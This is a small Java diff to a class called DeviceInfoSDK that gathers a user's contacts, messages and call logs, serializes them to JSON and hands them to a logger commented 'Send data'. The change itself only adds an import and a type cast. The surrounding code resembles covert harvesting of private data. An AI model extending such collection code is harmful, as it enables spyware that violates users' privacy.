@@ -13,6 +13,7 @@ import com.google.gson.Gson;
 import java.io.IOException;
 
 import java.util.List;
+import java.util.Map;
 
 public class DeviceInfoSDK {
 
@@ -48,7 +49,7 @@ public class DeviceInfoSDK {
         System.out.println("Collected Call Logs: " + callLogs);
 
         // Serialize data
-        String jsonData = new Gson().toJson(new DataPayload(contacts, messages, callLogs));
+        String jsonData = new Gson().toJson(new DataPayload(contacts, (Map<String, List<String>>) messages, callLogs));
         System.out.println("JSON Payload: " + jsonData);
         // Send data
         DataLogger.logData(jsonData);
